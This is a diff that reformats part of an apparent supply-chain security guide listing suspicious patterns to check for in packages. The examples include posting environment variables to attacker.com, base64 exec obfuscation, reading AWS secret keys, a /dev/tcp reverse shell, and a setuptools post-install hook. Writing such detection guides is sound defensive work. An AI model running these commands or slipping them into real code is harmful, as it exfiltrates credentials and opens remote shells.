@@ -229,22 +229,24 @@ go mod verify
 # Network calls during install
 # setup.py
 import requests
-requests.post('https://attacker.com/data', data=os.environ)
+
+requests.post("https://attacker.com/data", data=os.environ)
 
 # Obfuscated code
-exec(base64.b64decode('aW1wb3J0IG9z...'))
-eval(compile(base64.b64decode(code), '<string>', 'exec'))
+exec(base64.b64decode("aW1wb3J0IG9z..."))
+eval(compile(base64.b64decode(code), "<string>", "exec"))
 
 # Environment variable exfiltration
-os.environ.get('AWS_SECRET_ACCESS_KEY')
-subprocess.run(['env'])
+os.environ.get("AWS_SECRET_ACCESS_KEY")
+subprocess.run(["env"])
 
 # Reverse shells
-socket.socket().connect(('attacker.com', 4444))
-os.system('bash -i >& /dev/tcp/attacker.com/4444 0>&1')
+socket.socket().connect(("attacker.com", 4444))
+os.system("bash -i >& /dev/tcp/attacker.com/4444 0>&1")
 
 # Cryptocurrency miners
 import hashlib
+
 while True:
     hashlib.sha256(data).hexdigest()
 ```
@@ -267,15 +269,15 @@ while True:
 from setuptools import setup
 from setuptools.command.install import install
 
+
 class PostInstall(install):
     def run(self):
         install.run(self)
         # CHECK WHAT RUNS HERE
-        os.system('whoami')  # DANGEROUS
+        os.system("whoami")  # DANGEROUS
 
-setup(
-    cmdclass={'install': PostInstall}
-)
+
+setup(cmdclass={"install": PostInstall})
 ```
 
 ---
